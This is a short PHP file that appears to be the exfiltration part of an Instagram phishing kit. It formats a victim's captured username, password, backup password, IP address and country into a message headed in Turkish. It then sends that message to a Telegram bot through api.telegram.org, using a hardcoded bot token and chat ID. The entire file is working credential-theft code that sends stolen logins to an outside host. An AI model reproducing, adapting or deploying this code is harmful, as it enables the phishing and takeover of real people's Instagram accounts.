<?php
    $token='5110745281:AAGb6ad0iqToMAoqErFEw4Nzyv46Ou-cwP4';
    $data = [
        'text' => 'Global Scden Düşen !
        
Username: '.$username.'
Password: '.$password.'
Yedek PW: '.$password1.'
Ip Address: '.$ip.'
Country: '.$ulke.'
Link : instagram.com/'.$username.'

      ',
      'chat_id' =>5287825232
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>